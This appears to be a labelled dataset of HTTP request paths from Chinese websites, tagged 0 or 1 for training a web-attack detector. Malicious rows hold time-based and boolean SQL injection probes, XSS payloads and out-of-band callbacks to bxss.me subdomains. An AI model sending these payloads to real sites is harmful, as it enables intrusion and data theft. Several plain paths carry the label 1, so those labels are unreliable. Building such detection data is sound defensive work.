request	label
/****/zt/yqfkzccs/yqfkdt/index_50.html	0
/**********/system/2020/04/06/013132806.shtml	0
/****/xxgkml/rsrm/list_2.html	0
/if(now()=sysdate(),sleep(12),0)/******/ywdt/10.htm	1
/****/wdszs/hfsz/202010/t20201030_173516.html	0
/************/common-problem/jyxg/2017-0'xor(if(now()=sysdate(),sleep(22),0))xor'z-15/405.html	1
/***/0/00/10/29/102905_532740.jpg	0
/***/system/2011/09/28/010481391.shtml	0
/******/20211029.jpg	0
/*******/erf13z8q.php	1
/***/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/zwxx_11337/****/201707/t20170727_300677.html	0
/******/system/2021/04/19/013370850.shtml	0
/****/qzfwj/201801/t20180115_669135.html	0
/skin%' and 2*3*8=6*8 and 'bcuc'!='bcuc%/**/encrypt/jbase64.js	1
/****/bmkx/jkzx/202107/w020210719645801997481.jpg	0
/zwxx_11337/****/202111/t20211110_3122292_zzb.html	0
/****/czgk/bmjs/qtdw/zzqsbj/201908/t20190815_1663487.html	0
/zwxx_11337/****/201707/t20170727_300570.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e09\u8425\u9a6c\u9e4f\u7f8a\u7f94\u8089\u9986	0
/****/ghgz/202011/t20201126_259396.html' and 'x'='y	1
/***/viewspace-204.html	0
/**********/system/2020/05/31/013174394.shtml	0
/****/qzfwj/201801/t20180115_669173.html/index_1.html	0
/******/t20210727_312989.html	0
/if(now()=sysdate(),sleep(15),0)/****/jcgc/	1
/****/jtwxq/	0
/*****/20210607/javascript:void(0);	1
/*****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
"/vc"""" and 2*3*8=6*8 and """"hisy""""=""""hisy/**/lib/easyui/themes/bootstrap/linkbutton.css"	1
/***/003/004/336/00300433629_a9067634.png	0
/**********/system/2021/09/27/013457679.shtml	0
"/***/nbhd/opengovmsgbox.do?appid=4&method=listgovmsgboxs&pagesize=5&siteid=115<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u8273\u73cd\u5b9a\u8fb9\u809d\u5b50\u917f\u76ae\u9986	0
/**********/system/2020/12/11/013300581.shtml	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(1010)</script>?_=1630311687607"	1
/*******/qiye/b-e1701796.html	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u4f73\u8f89\u76db\u94f6\u5de5\u8d38\u6709\u9650\u516c\u53f8	0
/****************/notification?access_token=e62bc6dd-7e2a-4ef0-998a-03c5bb21de57&id=undefined	0
/******/bg-sqdtc.png	0
/****/xqldly/hfhnxz/zmhdyc_1.html	0
/***/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
"/****/admin/edit.php?title="""">pt>alert(777);< /script>pt>"	1
/*****/gy42/cpgyss.asp?key=sbwm-4 \u02eb&l2=\ufffd\ubd7a&l=\ufffd\ufffd\ufffd	0
/**/xgq/index.shtml	0
"/****/zzxxgk/"""".gethostbyname(lc(""""hitjs"""".""""olkrdhoe47415.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(113).chr(81).chr(110).chr(74).""""/zfxxgkml_2127/jgzn_2042/list.html"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5929\u5929\u7f51\u667a\u80fd\u79d1\u6280\u6709\u9650\u516c\u53f8	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqfpb/202002/t20200210_1948575.html	0
/**/ui'||'/script/page.js	1
/****/gsry/2009_506/9927.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u51af\u4e9a\u6d32\u5316\u5986\u54c1\u5e97	0
/************/template'||'/jcse/110105008056111/16/images/jquery.cookie.js	1
"/'""""()&%<acx><script >jl8q(9585)</script>/**/lib/easyui/plugins/jquery.linkbutton.js"	1
/**********/system/2021/06/03/javascript:void(0);	1
/****/ccp_48498/zwhd/202112/t20211218_3234432.html	0
/****/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg	1
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_117591c92de8950a0e3021ce67a6b70f/><!--<textarea>	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u8bda\u4fe1\u8fbe\u6c7d\u8f66\u4fee\u7406\u90e8	0
/***/db.html	0
/zwxx_11337/****/zzlist_38.html	0
/******/images/logo.jpg	0
/****/img2/8.jpg	0
/******/hfhnxz/202111/t20211122_196764.html	0
"/****/zfwjn/1079/1080/list.html?new="""".gethostbyname(lc(""""hitnl"""".""""whfitphb43aea.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(116).chr(73).chr(112).chr(67)."""""	1
/****/ezgg/eznxjl/201605/t20160513_83630.html	0
/***/0/02/04/58/2045839_768989.png	0
/****/qzfwj/201801/t20180115_669513.html	0
/**/ohac_10136	0
/******/system/2016/04/11/javascript:window.close();	1
"/************/template/jcse<esi:include src=""""http://bxss.me/rpb.png""""/>/110105008056111/16/images/view.js"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6e2f\u80a1	0
/******/web/jpage/theme' and 2*3*8=6*8 and 'sid0'='sid0/simple/css/jpage.css	1
/***/003/004/509/00300450921_efa8dacc.jpg	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u6b23\u7ef4\u96c5\u62a4\u80a4\u54c1\u5e97	0
/****/xqdt/jtx/201610/t20161025_43751.html	0
/****************/notification/negotiate?access_token=1e0677d6-d598-41d4-a7a1-965d5a2ebfa6	0
/******/ddh/ttyw/	0
/******/xxwzqh/img3/2.png	0
"/****/czgk/bmyjs/qtdw/zzqhtglzx/\""javascript:void(0)\"""	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u5c0f\u7530\u852c\u83dc\u6c34\u679c\u5e97	0
/**********/system/2021/10/22/013468621.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6e58\u76ca\u4e0d\u9508\u94a2\u914d\u4ef6\u7ecf\u9500\u90e8	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(118).concat(82).concat(109).concat(73) (require""""socket""""
socket.gethostbyname(""""hittm"""" """"roznikxp89cf8.bxss.me."""")[3].to_s) """"/*****/201610/t20161016_531.html"	1
/****/xh/hy/202101/t20210129_2587321.html	0
/***/bxss.me/7/12/art_35_234319.html	1
"/***/2021/10/11/art"""" and 2*3*8=6*8 and """"frrj""""=""""frrj_34_242319.html"	1
/***/0/01/90/62/1906273_130521.jpg	0
/****/contact-e38709.json?company_id=38709&article_id=0&version=v3&type=header	1
/****/whs/yw_1286/201905/t20190507_1465191.html	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202105/t20210513_182503.html	0
/****/ilist.jsp?cat_id=26046	0
"/******/resource/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/centercutimg.js"	1
/****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/*****/index.html	1
/***/api/alert(777)	1
/****/bmkx/sfgw/202104/w020210401559085273970.jpg	0
/************/template/jcse/bxss.me/16/images/main.css	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9e3f\u8fbe\u767e\u8d27\u65e5\u6742\u5e97	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d69\u767e\u76db\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/**********/system/2020/04/18/013143586.shtml	0
/**********/system/2020/05/20/013166179.shtml	0
/****/fkxxfy/202109/t20210906_186372.html	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12501,""place_id"":""fm_sp_ard"",""news_id"":""962276""}"	0
/********/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777)	1
/******/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/202107/t20210730_313250.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5349\u840d\u670d\u88c5\u5e97	0
/*****/index/detail/art_id'||'/239.html	1
/***/0/02/05/29/2052903_535093.jpg	0
"/**/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""""/>alert(777)"	1
/****/sso?ssocallback=getusid&r=1631942466236'||'	1
/***/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66	1
/****/0227/819624.shtml	0
/***********/shichangzixun/caiwuyaowen/2020-08-07/10166.html	1
/**********/system/2020/06/26/013193254.shtml	0
/*******/xan6c.php	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u5174\u76db\u7efc\u5408\u5546\u5e97	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419') and 1645=1645	1
"/****/""><script>alert(86)</script>"	1
/***************/lcgg/index_8.html	0
/*****/system/2021/12/01/javascript:void();	1
/*******/jlpecgnp.php	1
"/******/'""""()&%<acx><script >evhi(9657)</script>/jpage/theme/default/css/jpage.css"	1
/**********/system/2021/09/07/013447238.shtml	0
/***/0/01/94/22/1942273_581586.jpg	0
"/****/czgk/bmyjs/zzqzx/zzqzxbgt/\""javascript:void(0)\"""	1
/**********/system/2012/02/02/javascript:dozoom(14)	1
/****/bmkx/ssjj/201707/t20170720_92867.html	0
/**/index.php?do=post&id=358&c=dt&a=goods&	1
/****/zfgb/2019/201902/p020190211318803265545.pdf	0
/***/2021/10/12/art'||'_31_242356.html	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u91d1\u5929\u4e00\u7167\u660e\u7ecf\u9500\u90e8	0
/****/6e01gs-article-e113263391.html	0
/******//xfs.bxss.me/xys.css	1
/**********/system/2015/09/15/011820895.shtml	0
/***/003/004/442/00300444203_344d9fea.jpg	0
/****/byyw/202105/t20210507_181383.html	0
"/****/byszf/202007/t20200701_168748.html?leader=徐　峰<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/zwxx_11337/****/201608/w020170727676976850748.jpg	0
/**/jquery.superslide.js	0
/************/bxss.me/jcse/110105008056111/16/images/main.css	1
/******/home/images/yinying_03.png	0
/****/bmkx/shwj/index_10.html	0
/*****/system/2007/04/09/002097090.shtml	0
/***/interface/comul_total.json.jsp?callback=jquery191019821813761381213_1639980031153	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u8d5b\u9053\u7cbe\u795e	0
/****/jtdt/2021_jtyw/202111/w020211117419677291034.jpg	0
/*****/index' and 2*3*8=6*8 and 'tlrg'='tlrg/detail/art_id/239.html	1
/**********/system/2021/12/19/013496542.shtml	0
/************/common-problem'||'/jyxg/2017-02-15/406.html	1
/**********/system/2021/06/11/013400637.shtml	0
/****/20160804/1878.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u867e\u4e4b\u4e30\u6e14\u4e1a\u4e13\u4e1a\u5408\u4f5c\u793e	0
/*******/qiye/b-e2486013.html	0
/****/yqzt/qyddt/202005/t20200527_247881.html' and 'x'='x	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(4792)"">?_=1630312164522"	1
/*****/search.asp?field=my_baizi&classid=&keyword=\u00c9\u00bd\u00b1\u00be\u00d5\u00fd\u00c8\u00cb	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/***/main.css"	1
/***/0/11/00/43/11004354_507055.jpg	1
"/****/zfcwhy/202107/"""" """"a"""".concat(70-3).concat(22*4).concat(119).concat(67).concat(106).concat(89) (require""""socket""""
socket.gethostbyname(""""hitox"""" """"hqlfkzjk48722.bxss.me."""")[3].to_s) """"_2938511.html"	1
/****/qzfwj/202112/t20211215_3224517.html	0
/****/20201016/e108495518.html	0
/__local/*/00/cc/b7587aab48aa7892397f55d49cf_c487a1b8_1d6c4.jpg	0
/****/web/search?page=195&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/***/jt/syy/	0
"/****/category/guowaishichangzhunru?page=*/-->'""""></iframe></script></style></title></textarea><script >alert(32704)</script>"	1
/****/wzdt.htm	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5609\u6b23\u745e\u6e90\u5546\u8d38\u6709\u9650\u516c\u53f8	0
"/***/col17/index.html/<img src=""javascript:alert(681)"">"	1
/****/zt/2019wznb/zzqbm/202001/p020200116638942515749.pdf	0
/****/xqdt/pcq/index_2.html	0
/******/system/2016/06/13/012028053.shtml	0
/****/system/2017/08/03/012375318.shtml	1
/**/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php	1
/**/system/2021/06/16/012169996.shtml	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u9999\u51dd\u94c1\u677f\u9e2d\u67a3\u56ed\u6e56\u7554\u5e97	0
/**********/system/2021/08/17/013435882.shtml	0
/**********/system/2020/03/28/013127180.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19107149650742381015_1639980317499	0
/****/mavideo/gvideos.php?gid=1 and 1=1	1
"/****/czgk/bmjs/zzqfyxt/xjxrmfy/202108/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/zjdt/jsgcxfjg/gzdt'||'.htm	1
/****/zdlygk/ncwywfgz/zws/hyx'||'/xmb_gzdxb.htm	1
/*****/system/2019/10/28/javascript:window.close();	1
/****/xxgkml/qtfdxx/jytabl_3722/ztqk/202112/t20211201_197138_wap.html	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgxs/201702/t20170208_318551.html	0
/******/n42748'||'/c1719357/content.html	1
"/****/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom=""'/></script><script>alert(777)</script>"	1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 8168=7196 and '%%'='%	1
/*****/system/2016/05/20/012010012.shtml	0
/****/web/advanced.jsp	0
/*******/0xfr011.php	1
/******/usercenter/index?qrcode=46087&code=051shwfa17enkc0eueia1fbdgy1shwfg	0
/****/web/search?channelid=299868&perpage=1000	0
/***/0/00/26/65/266587_643147.jpg?pt=5&ek=1&kp=1&sce=0-12-12	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/******/bzxajgc/gys/jyx.htm	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsft/201712/t20171208_631069.html	0
/****/web/search?channelid=222832; waitfor delay '0:0:2&searchword=	1
/**/system/2020/11/12/012088957.shtml	0
/******/n236753/n236776'||'/c1649498/content.html	1
"/****/byszf/201610/t20161016_542.html?leader='""""()&%<acx><script >x0cu(9289)</script>"	1
/****/20200918/e106958040.html	0
/******/resource/js'||'/gotopage.js	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5180\u5b89\u6c34\u6696\u5efa\u6750\u7ecf\u9500\u90e8	0
/****/xyfw/ and 1=1	1
/*********/ashx/jqgridpositionhandler.ashx?userid=637371685611675296&oper=read&_search=false&nd=1639973245963&rows=-1&page=1&sidx=orderby&sord=asc	0
/****/bmkx/scl/201806/t20180604_104105.html	0
/****/jtdt/2011jtdt/201412/t20141218_38757.html	0
"/**/ui/widgets/hanweb/validity/css"""" and 2*3*8=6*8 and """"tqiu""""=""""tqiu/validity.css"	1
/****************/file/loadimage/?id=5a766ee4-d523-4840-a234-e500550c07b8	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u4e07\u8fbe\u5de5\u7a0b\u8bbe\u5907\u79df\u8d41\u90e8	0
/******/resource' and 2*3*8=6*8 and 'wtzd'='wtzd/js/vsb_news_search.js	1
"/****/group-summary.jsp?search=test"" onmouseover=alert(777) x="""	1
/zwxx_11337/****/201812/t20181220_1218718.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl and 1426=1426--&owner=1707212448&wbfileid=51419	1
/**/cgi-bin/ipinfo.cgi?alert(777)	1
"/****/zfxxgk/fdzdgknr/qtfdxx/qzqd/"""" """"a"""".concat(70-3).concat(22*4).concat(122).concat(74).concat(97).concat(89) (require""""socket""""
socket.gethostbyname(""""hitls"""" """"scyhvhkxe55a5.bxss.me."""")[3].to_s) """"/t20201106_2279316.html"	1
/****/gccb/txgc/images/p020141121378507650832.png	0
"/****/czgk/bmyjs/rmtt/fl/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/*/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script>	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9e3f\u8fd0\u8fbe\u5546\u884c	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u706b\u98df\u5c1a\u4e32\u4e32\u4e3b\u9898\u706b\u9505	0
/zwxx_11337/****/zcjd/202112/t20211201_3178005.html	0
/*****/gy48/cpgyss.asp?key=\u5899\u7eb8\u5c55\u5c55&l=\ufffd\ufffd\ufffd\ufffd	0
/***/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25	1
/***/0/00/02/35/23583_592972.jpg	0
/****/system/2021/11/26/013485915.shtml	0
/****/2020wzqh/wzqh_qwjd	0
/***/viewspace-228.html	0
/**********/system/2020/05/11/013159248.shtml	0
/******/visitcount/visit.jsp?i_articleid[0]==2and 3 in &i_articleid[1]=extractvalue(1,concat(char(126),md5(1121657788)))&i_columnid=15&i_webid=1&type=3	1
"/*****/index.php?action=list&order=name&srt=yes&lang=en""/><script>alert(777);</script>"	1
/****/b-e1076751.html	0
/****/zzxxgk/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/zfxxgkml_2127/jytabljg_2061/list.html	1
/****/zxxx/content.html?metadataid=10062996	0
"/****/index.cfm?field="""">alert(777)"	1
/**********/system/2020/10/02/013258638.shtml	0
/****/api/apiautographcontroller/autographpageg?url=https:/www.zsebank.com/tosignserver/action/contract/sign/1473117203472601088&signercode=42212419670303421x	0
/***/0/02/05/75/2057521_648657.jpg	0
/**********/system/2020/05/04/013154374.shtml	0
/**/system/2007/10/19/002233282.shtml	0
/**************/sys/mood/default/socialmoodtemplate.js	0
/****/t3ju8z-hynews-e115803889.html	0
/************/interfaces/autocomplete.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(4987)</script>?_=1630312235646"	1
/***/0/00/51/45/514571_993453.jpg	0
"/****/web/search?iptsword=*/-->'""""></iframe></script></style></title></textarea><script >alert(05096)</script>"	1
/****/index_1.html	0
/***/2021/12/7/art_34_247657.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5c0f\u5468\u7a97\u5e18\u5927\u4e16\u754c	0
/************/search.do?tpl=16&pq=1&begin=1&websiteid=110105008056111&end=1&pos=1&q=请输入关键词'||'&eq=1&pg=1&searchid=1&oq=1&p=1	1
"/****/category/siluzhibo?page=1'""""()&%<acx><script >4gsn(9067)</script>"	1
/****/20200729/e104254573.html	0
/****/sypc/202003/t20200304_148708.html	0
/****/qzfwj/5620/5639/index.html	1
/*****/system/2011/01/11/010269170.shtml	0
"/******/qhkc/jh/<img src=""javascript:alert(276)"">"	1
/*******/ky16d.php	1
/**********/system/2020/05/06/013155595.shtml	0
"/**/ui/lib"""" and 2*3*8=6*8 and """"3dhd""""=""""3dhd/security/sm2_util.js"	1
"/**/sys/sys/listabd2.jsp?bd=""/><script>alert(777)</script>"	1
/******/system/2021/03/15/javascript:void();	1
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u5d07\u5174\u9547\u76db\u5b8f\u5802\u7535\u78c1\u6cbb\u7597\u4eea\u9500\u552e\u90e8	0
"/****/czgk/bmyjs/zzqdwzfbmgljgsydw/ygcdryzzs/\""javascript:void(0)\"""	1
"/****/gfxwj/5619/5625/\""javascript:void(0)\"""	1
/***/003/004/456/00300445655_e15ffe5f.jpg	0
/*****/system/2019/03/22/javascript:void();	1
/***/0/00/47/42/474252_950918.jpg	0
/***/003/003/002/00300300272_fede9ccf.png	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u827a\u5929\u4e0b\u7f8e\u53d1\u5e97\u6c11\u751f\u8def\u5e97	0
/****/zxxx/content.html?metadataid=10062619	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u91d1\u6d77\u5a31\u4e50\u4f1a\u6240	0
/****/bmkx/swjw/201912/t20191220_145694.html	0
/***/system/2011/07/12/010409430.shtml	0
"/****/wlzj/202103'""""()&%<acx><script >0gna(9394)</script>/t20210303_2614145.html"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u592a\u9633\u5c71\u6d77\u8fbe\u5e9f\u65e7\u7269\u8d44\u8d2d\u9500\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7ea2\u745e\u8001\u5175\u519c\u4e1a\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/'.gethostbyname(lc('hitwa'.'wqcgmnhy36344.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(80).chr(99).chr(74).'/1088/1110/list.html	1
/**********/system/2012/09/14/010886815.shtml	1
/**/system/count/0003008/000000000000/count_page_list_0003008000000000000.js	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7a46\u6148\u5802\u7406\u7597\u6309\u6469\u4e2d\u5fc3	0
/zwxx_11337/****/202104/t20210412_2755626.html	0
/****/xxgkml/qtfdxx/zdjcyjzj/202001/t20200115_146511.html	0
/****/system/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/kbepsq-article-e108121204.html	0
/**********/system/2020/06/04/013178112.shtml	0
/****/css/chunk-cb36ffa2.fb7050a0.css	0
/******/home/images/5.jpg	0
/*********/user/findpass_msg.html?ac=email' and 2734=2624 and 'vjqz'='vjqz	1
/**********/system/2020/08/03/013218523.shtml	0
/***//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)>	1
"/**/vclogin"""" and 2*3*8=6*8 and """"rkwf""""=""""rkwf.do"	1
/****/web/search/search?page=3&channelid=287219&searchword=1' and 8114=5748 and 'zlep'='zlep&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10	1
/****/system/more/2412000000000000/0000/2412000000000000_00000023.shtml	0
/****/wdszs/hfsz/201901/t20190103_113110.html	0
/******/system/2017/12/21/javascript:window.print()	1
/about-southwest/information-disclosure/**/skin/wdatepicker.css	0
"/***/col109/index.html/<img src=""javascript:alert(6383)"">"	1
/*****/system/2008/03/22/002455420.shtml	0
"/****/server/news/show/title/time-for-a-heavy-harvest-new-release/src/""><script>alert(777)</script>@random4cd201e063d5c"	1
/****/xxgkml/qtfdxx/ssjygk/sjccjg/201912/t20191202_145025.html	0
/***/index.php?m=member&c=index&a=register&siteid=1	1
/zwxx_11337/***/202010/t20201030_2272012.html	0
/**/system/2021/11/29/012226076.shtml	0
/***/xwzx/szyw/gjcp/hbsb/rssdy/xxgk/rsxcsx/kjcx/kycg/zscq/gygj/gjgk/ywly/	0
/****/web/search?page=2&channelid=253477&searchword=1%' or 2025=8266 and '%%'='%&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/****/ssgs/lkgx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6dd1\u82b1\u6c46\u9762\u9986	0
/****/web/search?page=2&channelid=253477 and 3892=5327--&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u9a6c\u5bb6\u6e05\u771f\u7cd5\u70b9\u52a0\u5de5\u90e8	0
"/****/zjdt/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/gzdt/144.htm"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u5bcc\u6e90\u9762\u9986\u5206\u5e97	0
/****/20201231/9205.html	0
"/******/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/jquery.ellipsis.js"	1
/****/zt/ydyl/202108/t20210820_2983031.html	0
/vc' and 2*3*8=6*8 and '1blf'='1blf/**/lib/jquery/jquery.min.js	1
/*****/gy48/cpgyss.asp?key=\ufffd\u07ff\ufffd\u00f7\ufffd\ufffd\ufffd\u0733\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zxft/	0
/**********/system/2021/08/06/013431450.shtml	0
/***/mavideo/gvideos.php?gid=1 and 1=2	1
/**********/system/2014/10/08/011523824.shtml	0
/*****/index/detail/art_id/209.html	0
/**********/system/2020/04/25/013148655.shtml	0
"/**********/system/2021/09/07'""/><img src=javascript:alert(810) /013447361.shtml"	1
/************/template/jcse/110105008056111/http://bxss.me/t/fit.txt/images/main.css	1
/***/interface/daily_clickcount.json.jsp?callback=jquery111104617661458902669_1639990843674	0
"/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq="""" """"a"""".concat(70-3).concat(22*4).concat(106).concat(65).concat(102).concat(85) (require""""socket""""
socket.gethostbyname(""""hitiw"""" """"sbgtvvmc6ddef.bxss.me."""")[3].to_s) """"&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/*******/b14227c.php	1
/****/jtdt/2020_jtyw/202010/w020201016435412239658.jpg	0
/*****/gy48/cpgyss.asp?key=\u7cbe\u5bc6\u6a21\u7ec4&l=\ufffd\ufffd\ufffd\ufffd	0
"/(select(0)from(select(sleep(43.368)))v)/*' (select(0)from(select(sleep(43.368)))v) '"""" (select(0)from(select(sleep(43.368)))v) """"*//******/"	1
/**********/system/2020/03/25/013124542.shtml	0
/*****/gy42/ljcpgyview.asp?id=29630662&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3dab	0
//***********/ui/lib/easyui/plugins/jquery.panel.js	1
/*******/qiye/b-e545182.html	0
/****/gjgk/fzlc	0
/****/zjdt/zjdt/zcwj/64.htm	1
"/****/yd/yw_1280/\""javascript:void(0)\"""	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u8d6b\u62c9\u5316\u5986\u54c1\u4e13\u67dc	0
